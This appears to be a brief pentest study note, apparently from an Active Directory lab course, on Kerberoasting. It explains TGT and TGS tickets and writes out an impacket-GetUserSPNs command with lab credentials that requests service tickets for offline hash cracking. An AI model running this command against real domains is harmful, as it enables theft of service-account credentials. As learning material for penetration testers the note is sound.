- Takes advantage of **`Service Accounts`**
- TGT -> Ticket Granting Ticket (Every authenticated user on domain can request this from DC or KDC (Key Distribution Center))
- TGS -> Ticket Granting Service (Service ticket that provides server interaction access)
![[Pasted image 20250329164841.png]]
# Attack
---
- `impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.1.4 -request`
	- Requesting TGS from DC
- Crack the hash got from TGS
